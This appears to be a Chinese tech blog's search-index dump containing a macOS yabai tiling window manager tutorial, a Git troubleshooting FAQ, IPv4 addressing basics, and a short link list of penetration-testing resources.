什么是平铺式窗口管理器 与平铺式窗口管理器相对的，是浮动式窗口管理器，也就是 Windows 和 macOS 下默认的窗口管理器。在浮动式窗口管理器下，窗口可以自由移动、自由调整大小，窗口之间可以相互重叠。 而平铺式窗口管理器，能够将窗口平铺在桌面上，窗口之间不能相互重叠。 平铺式窗口管理器大多具有如下特点： 纯键盘操作 切换活动窗口、最大化/全屏、调整窗口大小、调整布局方式、添加/删除/切换桌面、移动窗口到其他桌面、移动窗口到其他显示器…… 所有与窗口管理的操作，都可以通过键盘来实现。部分窗口管理器甚至不提供鼠标操作，只提供键盘操作。 虽然通过纯键盘的方式管理窗口，会增加学习和记忆成本。但和 Vim、双拼输入法等软件类似，熟练掌握键盘后，能够大幅度提升窗口管理的效率和操作的爽快感。 自动进行窗口布局 在打开较多窗口、使用较大显示器的情况下，使用浮动式窗口管理器，需要花费精力不停切换窗口、调整窗口的大小和位置…… 而平铺式窗口管理器，默认就能按照一定的布局方式，将窗口平铺在桌面上，从而减少手动调整窗口带来的工作量。 完善的多桌面、多显示器支持 多数平铺式窗口管理器，对于多个桌面、多个显示器之间的窗口切换都有着完善的支持。如下图片来自 Awesome 官网，从中可以感受到在多显示器环境中使用平铺式窗口管理器的体验： 使用 Awesome 进行多显示器窗口管理 （图片来源：https://awesomewm.org/） 高度的可定制能力 包括 yabai 在内的平铺式窗口管理器，都能够通过配置文件进行丰富的设置，从而更加满足自己的使用习惯。 安装 yabai 注意：为了使 yabai 正常工作，需要在运行 yabai 之前，关闭 macOS 的系统完整性保护（SIP）。请自行了解该操作可能带来的安全风险，如果不确定，建议首先在虚拟机中体验。 本节将介绍使用 Homebrew 安装 yabai, 导入 yabai GitHub 仓库中的示例配置，并安装 skhd 做为 yabai 的快捷键工具的完整过程。更多安装方式，请参考 yabai 的 README 文件。 首先安装 yabai（如果电脑中没有 Homebrew, 请先安装 Homebrew）: brew install yabai sudo yabai --install-sa 然后安装 skhd, skhd 用于给 yabai 提供快捷键支持，也可以用其他快捷键工具代替： brew install koekeishiya/formulae/skhd 下载 skhd 和 yabai 的示例配置文件： curl https://raw.githubusercontent.com/koekeishiya/yabai/master/examples/yabairc --output ~/.yabairc curl https://raw.githubusercontent.com/koekeishiya/yabai/master/examples/skhdrc --output ~/.skhdrc 启动 skhd 和 yabai 服务： brew services start skhd brew services start yabai 第一次启动 skhd 和 yabai 之后，macOS 会提示是否允许两者访问辅助功能。在系统偏好设置中添加权限后，再重启一次 skhd 和 yabai, 即可正常工作： brew services start skhd brew services start yabai 使用 yabai 在完成上述步骤后，yabai 就已经启动，并在后台正常运行了。这时候会发现，所有的窗口都不听使唤了，无论怎么移动，怎么调整大小，窗口都会自动停靠在桌面的一角😂 这时候先不要慌，这是平铺式窗口管理器工作的正常现象。可以先按 Control + Option + D 切换回传统的浮动模式，就可以继续自由移动窗口了。准备好下一步操作后，按一下 Control + Option + A, 即可切换为平铺模式。 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:0:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"调整窗口分布 yabai 默认使用 Binary Space Partitioning 的布局来排列窗口：只打开一个窗口时，窗口充满全屏；打开两个窗口时，两个窗口各占屏幕的 1/2, 打开三个窗口时，一个窗口占屏幕的 1/2, 另外两个窗口各占屏幕的四分之一…… Binary Space Partitioning 示意图 也就是说，在打开多个窗口的时候，屏幕被分割成多个大小不同的区域。这时候可以通过快捷键来移动窗口，将不同窗口放置在不同大小的区域。 Shift + Option + h: 左移当前活动窗口 Shift + Option + j: 下移当前活动窗口 Shift + Option + k: 上移当前活动窗口 Shift + Option + l: 右移当前活动窗口 熟悉 Vim 的话，应该不会 h, j, k, l 四个键控制方向感到陌生。 另外，还可以使用 Option + r 键来旋转桌面的布局，使较大窗口和较小窗口都能分布在屏幕的合适位置。 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:1:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"调整窗口大小 虽然 yabai 将屏幕分割为不同大小的区域，但有些时候，我们还是需要对窗口大小做进一步的调整，或者最大化某个窗口： Shift + Option + a: 增大当前活动窗口左侧 Shift + Option + s: 增大当前活动窗口下侧 Shift + Option + w: 增大当前活动窗口上侧 Shift + Option + d: 增大当前活动窗口右侧 Shift + Command + a: 缩小当前活动窗口左侧 Shift + Command + s: 缩小当前活动窗口下侧 Shift + Command + w: 缩小当前活动窗口上侧 Shift + Command + d: 缩小当前活动窗口右侧 Option + f: 最大化/恢复当前窗口 Shift + Option + 0: 恢复原始窗口大小 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:2:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"切换活动窗口 在使用 yabai 之后，虽然能够继续使用鼠标/触控板来切换活动窗口，但 yabai 提供了一系列快捷键，可以更高效地实现活动窗口的切换。 Option + h: 使左侧窗口成为活动窗口 Option + j: 使下方窗口成为活动窗口 Option + k: 使上方窗口成为活动窗口 Option + l: 使右侧窗口成为活动窗口 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:3:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"使单个窗口成为浮动模式 对于某些不需要成为平铺模式，受窗口管理器控制的窗口（例如微信的聊天窗口，大部分时候处于关闭或最小化状态，只有需要回复消息时才会短暂打开），yabai 也能够灵活地将其单独设置为浮动模式，从而使窗口可以自动缩放。 Option + t: 使当前活动窗口成为浮动模式 Option + p: 使当前活动窗口成为浮动模式，以类似「画中画」的形式显示在屏幕右上角 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:4:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"多个桌面的管理 在窗口较多，单个桌面无法容纳下的时候，可以创建新的桌面，并将窗口移动到新的桌面上。 Shift + Command + n: 创建新桌面 Command + Option + n: 创建新桌面，并将当前活动窗口移动至新桌面 由于篇幅限制，更多快捷键组合，例如多显示器的支持等，在本文中不再详细介绍。具体请参考 skhd 的默认配置文件，以及 yabai 文档。 定制 yabai yabai 和 skhd 都有着比较强的可定制能力，可以通过修改 ~/.yabairc 和 ~/.skhdrc, 对其进行个性化的设置。 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:5:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"打开状态栏 yabai 拥有一个简洁的状态栏，用于代替 macOS 的 Menubar, 显示当前桌面，以及时间和电量等信息。效果如下： yabai 状态栏 状态栏默认不显示，可通过修改配置文件来打开。方法如下： 首先打开终端，输入 nano ~/.yabairc（或 vi ~/.yabairc），打开 yabai 的配置文件，找到文件中 bar settings 的地方： # bar settings yabai -m config status_bar off yabai -m config status_bar_text_font \"Helvetica Neue:Bold:12.0\" yabai -m config status_bar_icon_font \"FontAwesome:Regular:12.0\" yabai -m config status_bar_background_color 0xff202020 yabai -m config status_bar_foreground_color 0xffa8a8a8 yabai -m config status_bar_space_icon_strip I II III IV V VI VII VIII IX X yabai -m config status_bar_power_icon_strip   yabai -m config status_bar_space_icon  yabai -m config status_bar_clock_icon  此处就是 yabai 状态栏的设置选项。将第一行的 off 修改为 on, 即可打开状态栏。 在后面几行中，还可以对状态栏的字体、颜色、图标进行设置。在 status_bar_space_icon_strip 行，将 I, II, III 等修改为 emoji 或 FontAwesome 图标字体，就可以为对应序号的桌面，指定为对应的图标。（例如可以将前三个桌面分别设置为「写作」、「资讯」、「娱乐」图标，然后将同类 App 放在同一个桌面上） 配置文件修改保存之后，安装 FontAwesome 4 字体，设置自动隐藏 macOS Menubar，然后执行如下命令重启 yabai, 即可看到状态栏： brew services restart yabai ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:6:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"设置窗口之间的间隔 在 yabai 的默认设置中，窗口之间的间隔较大。可以适当减小窗口之间的间隔，提高桌面空间利用率。 修改方法：在 ~/.yabairc 中找到如下配置，适当减小相关数值即可： # general space settings yabai -m config layout bsp yabai -m config top_padding 20 yabai -m config bottom_padding 20 yabai -m config left_padding 20 yabai -m config right_padding 20 yabai -m config window_gap 10 例如我将前四个值修改为 0, 最后一个值修改为 3 之后，效果如下图所示： yabai 缩小窗口之间的间隔后的效果 ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:7:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"自定义快捷键、快速打开终端 yabai 的快捷键功能，是通过 skhd 来实现的。所以，修改 ~/.skhdrc, 即可实现自定义快捷键。 例如，在 Linux 中，部分窗口管理器将 Alt/Win + 回车 做为打开终端的快捷键。而对于需要经常使用终端的 macOS 用户，就可以使用 skhd 为终端指定一个快捷键。 默认的 .skhdrc 中，第二行已经将 Command + 回车 做为打开 kitty 的快捷键： cmd - return : /Applications/Kitty.app/Contents/MacOS/kitty --single-instance -d ~ 而如果自己的常用终端不是 kitty, 而是 iTerm2, 只需将这一行修改为如下内容，即可使用 Command + 回车 快速打开 iTerm2. cmd - return : open /Applications/iTerm.app ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:8:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":["Apple","MacOS","系统"],"content":"通过脚本实现自动化操作 在 .skhdrc 中可以发现，所有 yabai 相关的操作，都是通过 yabai -m 命令，向 yabai 发消息来实现的。所以，我们也可以在自己的脚本中，加入 yabai -m 相关命令，来实现自动化操作。 如下脚本是一个简单的示例： #!/bin/bash # 创建一个新桌面，并切换至新桌面 yabai -m space --create id=$(yabai -m query --displays --display | grep \"spaces\") yabai -m space --focus $(echo ${id:${#id}-3:1}) # 打开备忘录、提醒事项和文本编辑 open /Applications/Notes.app open /Applications/Reminders.app open /Applications/TextEdit.app 通过此脚本，即可创建一个新桌面，然后在新桌面上同时打开备忘录、提醒事项、文本编辑。当然也可以在 .skhdrc 中为这个脚本分配一个快捷键，只需一个按键，就可以执行上述一系列操作。 延伸阅读 yabai 还是一个比较新的软件，经过两天的试用，仍会偶尔遇到一些小 bug, 例如窗口无法自动调整大小等；另外，必须关闭 SIP 才能正常使用，也不方便大部分对 macOS 安全性有要求的人使用。希望后续的版本能够进一步完善，为我们带来更好的体验。 在 Windows 上，也可以尝试 bug.n, 这是一款基于 AutoHotKey 的窗口管理工具，与 yabai 有着类似的功能： koekeishiya/yabai: A tiling window manager for macOS based on binary space partitioning 如果想了解关于平铺式窗口管理器的更多内容，可以参考如下链接： Why Use A Tiling Window Manager? Speed, Efficiency and Customization! - YouTube ChunkWM tutorial on macOS! - YouTube CHUNKWM + SKHD - Mac OS X Mojave deserves a Tiling Window Manager system too - YouTube 5 reasons the i3 window manager makes Linux better | Opensource.com 平铺式窗口管理器 Musca 初体验 · LinuxTOY 平铺式窗口管理器-Awesome | HaHack 平铺式窗口管理器——Awesome · LinuxTOY ","date":"2021-10-22","objectID":"/zh-cn/2021-10-21/:9:0","tags":["Apple","MacOS","系统"],"title":"Mac OS 上的平铺窗口管理工具 yabai ","uri":"/zh-cn/2021-10-21/"},{"categories":[],"content":" 扫码加我来问我嘛😄 听会儿与我慢慢聊😄 ","date":"2021-10-22","objectID":"/zh-cn/about/:0:0","tags":[],"title":"关于","uri":"/zh-cn/about/"},{"categories":[],"content":"渗透测试代码 慢慢收集—– ","date":"2021-10-22","objectID":"/zh-cn/exppoc/:0:0","tags":[],"title":"ExpPOC","uri":"/zh-cn/exppoc/"},{"categories":[],"content":"1.https://frida.re/ ","date":"2021-10-22","objectID":"/zh-cn/exppoc/:0:1","tags":[],"title":"ExpPOC","uri":"/zh-cn/exppoc/"},{"categories":[],"content":"2.https://armconverter.com/ ","date":"2021-10-22","objectID":"/zh-cn/exppoc/:0:2","tags":[],"title":"ExpPOC","uri":"/zh-cn/exppoc/"},{"categories":[],"content":"3.https://www.anquanke.com/member.html/memberId=131652 ","date":"2021-10-22","objectID":"/zh-cn/exppoc/:0:3","tags":[],"title":"ExpPOC","uri":"/zh-cn/exppoc/"},{"categories":["Git"],"content":"Git问题汇总 Git问题汇总 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:0:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"初次配置用户名和邮箱 Git在push时需要使用到user.name和user.email，一般通过命令来进行配置或修改。 查看user.name git config user.name 查看user.email git config user.email 配置user.name git config --global user.name \"your user name\" 配置user.email git config --global user.email \"your user email\" 这里需要注意的是，配置命令只能用于初次配置user.name/email，如果不小心配置错误，或者重复配置，不可以通过重复执行以上命令来修改user.name/email，否则可能或报错说无法重复配置，或者导致一个key配置了多个value。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:1:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"修改user.name/user.email 如果想要修改已经配置过的user.name或email，有两种方式，一种是通过命令来修改；一种是直接修改.gitconfig文件。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:2:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"方式一：通过命令修改 //修改user.name git config --global --replace-all user.name \"your user name\" //修改user.email git config --global --replace-all user.email\"your user email\" ","date":"2021-10-22","objectID":"/zh-cn/22-1/:2:1","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"方式二：修改.gitconfig文件 该文件是隐藏文件，位于C:\\Users\\{user}\\.gitconfig，直接修改里边的name或者email，如果有重复的name或email，可以将其删掉，只剩下一个就好。 修改完，通过git bash输入git config –list可以查看是否修改成功了。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:2:2","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":".gitignore文件的作用 .gitignore文件用来忽略被指定的文件或文件夹的改动，被记录在.gitignore文件里的文件或文件夹，是无法被git跟踪到的，换句话说，被忽略的文件是不会被放入到远程仓库里的。 也就是说，如果文件已经存在于远程仓库中，是无法通过.gitignore文件来忽略的。 .gitignore文件存放于git仓库的根目录下。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:3:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":".gitignore文件的语法 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:4:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"注释 #表示注释，如下： 1 # Here is comment. ","date":"2021-10-22","objectID":"/zh-cn/22-1/:4:1","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"忽略文件/文件夹 直接写入文件或文件夹名即可，指定文件夹里的所有文件也会一起被忽略，如下： 1 2 3 4 5 6 7 8 # ignore target folder target/ # ignore Eclipse files .settings/ build/ .classpath .project ","date":"2021-10-22","objectID":"/zh-cn/22-1/:4:2","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"不忽略文件/文件夹 !表示不忽略指定的文件，如下： 1 2 # don't ignore src folder !src/ ","date":"2021-10-22","objectID":"/zh-cn/22-1/:4:3","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"在指定文件夹里不忽略指定的文件 通过!可以实现更加有意思的用法，如下： 1 2 3 # ignore scaffolds folder, but don't ignore draft.md under scaffolds folder. scaffolds/* !scaffolds/draft.md **注意：这里必须在文件夹后面加上/*，否则是无法实现想要的效果的。并且被忽略的文件和想要不忽略的文件必须是同一路径，否则无法生效。**如下的写法就是不能生效的： 1 2 3 # ignore scaffolds folder, but don't ignore draft.md under scaffolds folder. scaffolds/* !scaffolds/test/draft.md 想要生效就要改成同一目录： 1 2 3 # ignore scaffolds folder, but don't ignore draft.md under scaffolds folder. scaffolds/test/* !scaffolds/test/draft.md ","date":"2021-10-22","objectID":"/zh-cn/22-1/:4:4","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"使用通配符及其他符号 可以使用通配符及其他符号来指定复杂条件的文件，如下： 1 2 3 4 *.log day_1?.txt hello[0-9].txt hi[^0-9].txt *表示匹配任意字符； ?表示匹配一个字符； [] 表示匹配中括号内的单个字符： 可以使用-来表示连贯的字符，比如0-9，a-z，A-Z等，[0-9]表示匹配从0到9的单个字符。 可以使用^来表示除外，比如[^0-9]表示除0到9之外的单个字符。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:4:5","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":".gitignore怎么忽略已经被版本控制的文件 如果某个文件已经存在于远程仓库了，也就是说某个文件已经被版本控制了，如果将该文件添加到.gitignore中，是无法生效的。因为.gitignore是用来控制尚未被纳入版本控制的文件，如果文件已经存在于远程库中，自然也就无法生效了。 于是就此衍生了一个问题：.gitignore怎么忽略已经被版本控制的文件？ ","date":"2021-10-22","objectID":"/zh-cn/22-1/:5:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"方法一 直接在远程库里将想要忽略的文件删除掉，再将该文件写入.gitignore中即可。 这种做法的前提是，你确定该文件是允许从远程库删除掉的，然而有些时候，这种做法是不可能的。要么没权限去远程库删掉该文件，要么该文件是必须的。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:5:1","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"方法二 使用命令git rm --cached filename，然后将该文件写入.gitignore中即可。 该命令表示从git仓库中将文件移除，不再进行版本控制，但保留工作区的该文件。 需要注意的是，该命令其实和方法一差不多。git rm表示移除某个文件，--cached表示从暂存区中移除，如果不加该参数就是直接从工作区移除了。 工作区就是指的Working Tree，暂存区就是指的Stage。工作区就是我们的磁盘，被版本控制的文件都存放于工作区。如果改动了某个文件，首先要将该文件添加到暂存区(Stage)，然后再提交(commit)到本地仓库，最后才推送(push)到远程库。 git rm --cached filename并不会从物理上删除文件，只是从暂存区中将文件删除。由于该文件原本已经被版本控制了，使用了该命令后，虽然保留了工作区的该文件，但是却会在暂存区中生成一个删除了该文件的记录，如果此时进行commit，就会把版本库里的该文件给删掉了，如果push到远程库，也会被删掉。最终还是走的方法一的路子。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:5:2","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"关于git rm --cached filename的补充 看到有篇文章举例很详细，如下： 新建文件1.txt，未被跟踪(Untracked files)，提交到暂存区(Changed to be committed)，未提交到版本库。 使用 git rm —cached 1.txt ： 把文件恢复到未被跟踪的状态，即删除暂存区中的1.txt； 文件1.txt，已经提交到版本库，工作区，暂存区都是干净的。使用 git rm —cached 1.txt ： 把工作区的文件1.txt置为了”未跟踪”状态，即Untracked files 暂存区生成一个deleted 1.txt的记录，如果提交了，就是把版本库中的1.txt删除。 不影响工作区中的文件。 文件1.txt, 已经提交到版本库，修改1.txt，并且提交到了暂存区。使用 git rm —cached 1.txt ： 把工作区的文件1.txt置为了”未跟踪”状态，即Untracked files。 暂存区生成一个deleted 1.txt的记录，如果提交了，就是把版本库中的1.txt删除。 不影响工作区中的文件。还是修改后的1.txt 文件1.txt, 已经提交到版本库，修改1.txt，提交到暂存区，继续修改1.txt。使用git rm —cached 1.txt 会报错，不能执行操作。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:5:3","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"Git - Merge: refusing to merge unrelated histories ","date":"2021-10-22","objectID":"/zh-cn/22-1/:6:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"场景 我在本地有个代码仓库local-A，本地仓库local-A已经和一个远程仓库remote-A关联了。 接着我又在GitHub上新建了一个仓库remote-B，我希望将本地仓库local-A的本地dev分支push到这个新建的远程库remote-B。我的想法是这样的： 在本地仓库local-A里添加刚刚新建的远程库remote-B 检出(check out)并切换到remote-B的master分支 将本地dev分支merge到当前的master分支 解决可能发生的冲突后，将改动全部commit并push到远程库remote-B的master分支上 接着当我做到第三步的时候，发现报错如下： 1 Merge: refusing to merge unrelated histories 看到报错，我又重新操作了一遍，依然是同样的错误。记得以前我也做过类似的操作，但是却没有现在的问题，百度了下，发现可能是git升级之后造成的。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:6:1","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"解决方案 因为两个仓库是不同的项目(本地仓库已经跟踪了另外一个远程库了)，git默认不允许不相干的项目进行push等操作。如果想要进行这些操作，就需要加入--allow-unrelated-histories参数才可以合并两个不同的项目： 1 git merge --squash dev --allow-unrelated-histories 这句命令表示将dev分支合并到当前分支，这里的两个本地分支各自追踪不同的远程库，需要加入--allow-unrelated-histories参数才能够完成合并操作而不报错，至于--squash参数是为了压缩dev分支原本的commit历史，可以将原本所有的commit历史合成一个commit，以避免当前分支在合并之后掺入了其他项目的commit历史。 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:6:2","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"warning: LF will be replaced by CRLF 这个问题由不同平台的换行符不同所造成： CR是回车，CarriageReturn，即\\r（return）。LF是换行，LineFeed，即\\n（newline）。 Dos和Windows平台使用CRLF来结束一行。 Mac和Linux平台使用LF来结束一行。（最早Mac以CR来结束一行，后改为了LF） 影响： Unix/Mac系统下的文件在Windows里打开，所有文字会变成一行。 Windows的文件在Unix/Mac下打开，在每行的结尾可能会多出一个^M符号。 Linux保存的文件在windows上用记事本查看会出现黑点。 解决方法： 为了避免git管理的项目中出现混合的换行符，通常会将项目的换行符设置为LF。 对于Windows平台，git的客户端默认设置为core.autocrlf=true。在提交文件时，会自动将换行符转换为LF，在检出文件时则自动转为CRLF。 1 git config --global core.autocrlf true 对于Mac和Linux平台，可以将配置设置为input。这样在提交文件时会转为LF，检出时则不转换。 1 git config --global core.autocrlf input 如果只使用Windows平台进行开发并运行项目，可以设置为false，来取消git自动转换换行符的功能。 1 git config --global core.autocrlf false 还可以配置core.safecrlf来改变git对于换行符的检查行为： 1 2 3 4 5 6 7 8 #拒绝提交包含混合换行符的文件 git config --global core.safecrlf true #允许提交包含混合换行符的文件 git config --global core.safecrlf false #提交包含混合换行符的文件时给出警告 git config --global core.safecrlf warn 可以通过以下命令来查询Git的配置： 1 2 3 4 5 // 查询配置 git config -l // 查询全局配置 git config -l --global ","date":"2021-10-22","objectID":"/zh-cn/22-1/:7:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"统计代码提交行数 可以在git bash里用git log命令来统计，部分参数说明如下： 1 2 3 4 5 6 7 8 9 10 11 12 --author 指定作者 --stat 显示每次更新的文件修改统计信息，会列出具体文件列表 --shortstat 统计每个commit 的文件修改行数，包括增加，删除，但不列出文件列表 --numstat 统计每个commit 的文件修改行数，包括增加，删除，并列出文件列表 --pretty 使用其他格式显示历史提交信息 --pretty=tformat 可以定制要显示的记录格式 --since, --after 仅显示指定时间之后的提交 --until, --before 仅显示指定时间之前的提交 -w 显示字数 -c 显示Bytes数 -l 显示行数 统计某段时间内的提交： | 1 | git log --since ==2021-09-01 --until=2021-10-05 | wc -l | | —- | ———————————————————- | | | | 统计当前用户的代码提交量，包括增加、删除： | 1 | git log --author=\"$(git config --get user.name)\" --pretty=tformat: --numstat | gawk '{ add += $1 ; subs += $2 ; loc += $1 - $2 } END { printf \"added lines: %s removed lines : %s total lines: %s\\n\",add,subs,loc }' | | —- | ———————————————————— | | | | 统计仓库排名前五的提交： | 1 2 3 4 | git log --pretty='%aN' | sort | uniq -c | sort -k1 -n -r | head -n 5 --按照邮箱来统计排名前五的提交（邮箱名不同，但是用户名可以相同） git log --pretty=format:%ae | gawk -- '{ ++c[$0]; } END { for(cc in c) printf \"%5d %s\\n\",c[cc],cc; }' | sort -u -n -r | head -n 5 | | ———- | ———————————————————— | | | | 贡献者统计： | 1 | git log --pretty='%aN' | sort -u | wc -l | | —- | ——————————————- | | | | 提交数统计： | 1 | git log --oneline | wc -l | | —- | —————————- | | | | 添加或修改的代码行数： | 1 | git log --stat|perl -ne 'END { print $c } $c += $1 if /(\\d+) insertions/;' | | —- | ———————————————————— | | | | Mr·Yang 常用 git init git remote add origin https://exmpler.com git branch -M main git add . git commit -m \"Mr·Yang\" git push origin main git branch -vv git clone git clone -b git branch -r git branch -a git branch -D git branch -b main origin/site git checkout --orphan laster git submodule add https://exmpler.com ","date":"2021-10-22","objectID":"/zh-cn/22-1/:8:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["Git"],"content":"参考链接 .gitignore 规则写法 - 在已忽略文件夹中不忽略指定文件、文件夹【注意项】 .gitignore无效，不能过滤某些文件 git rm - - cached filename git忽略已经被提交的文件 如何去解决fatal: refusing to merge unrelated histories git merge –no-ff是什么意思 关于git提示“warning: LF will be replaced by CRLF”终极解答 用git统计代码提交行数 ","date":"2021-10-22","objectID":"/zh-cn/22-1/:9:0","tags":["Git"],"title":"Git问题汇总","uri":"/zh-cn/22-1/"},{"categories":["网络"],"content":"计算机网络基础 计算机网络基础 ","date":"2021-10-22","objectID":"/zh-cn/22/:0:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"IP地址 IP地址由网络号（包括子网号）和主机号组成，网络号（包括子网号）相同意味着在同一网段下。在IPv4中，IP地址是一个32位的整数，对应4个字节，通常用x.x.x.x的点式十进制方式来表示。 **主机号为全0时，代表当前网络地址；主机号为全1时，代表当前网络的广播地址。**当向某个网络的广播地址发送消息时，该网络内的所有主机都能收到该广播消息。 IP地址可以分为A，B，C，D类地址： A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255； B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255; C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。 D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）； E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。 只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。 ","date":"2021-10-22","objectID":"/zh-cn/22/:1:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"255.255.255.255和0.0.0.0 广播地址通常称为直接广播地址，是为了区分受限广播地址（255.255.255.255）。 受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。 0.0.0.0常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由器屏蔽的范围内）的服务器发送IP请求分组。 ","date":"2021-10-22","objectID":"/zh-cn/22/:2:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"回环地址 127.0.0.0/8被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是127.0.0.1。 这里的/8表示子网掩码的位数。 ","date":"2021-10-22","objectID":"/zh-cn/22/:3:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"A、B、C类私有地址 私有地址(private address)也叫专用地址（即内网IP），只能在局域网使用，不能直接连上互联网，必须通过公网IP（公有地址）上网。 因为IPv4协议的IP地址不够全球用户使用，所以需要私有地址来解决这个问题。比如运营商分配公网IP给某个局域网，一个局域网中的所有主机使用私有IP来识别，并通过同一个公网IP来上网。 A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255 B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255 C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255 这就是为什么我们用ipconfig（Linux用的是ifconfig命令）得到的IP地址通常都是172.开头的B类私有地址，或者是192.168.开头的C类私有地址。如果百度IP，则会得到一个公网IP。 ","date":"2021-10-22","objectID":"/zh-cn/22/:4:0","tags":["网络"],"title":"计算机网络基础","uri":"/zh-cn/22/"},{"categories":["网络"],"content":"子网掩码 由于IPv4中网络号占位较多，导致主机号数量较少。为了解决这个问题，通过将主机号的高位再次划分为子网络号，以此形成多个子网，提供给不同规模的用户群使用。 不同子网下的主机不能直接通信，好处是缩小看广播域，减少广播风暴，相对安全性能提高，出现问题也更易定位。 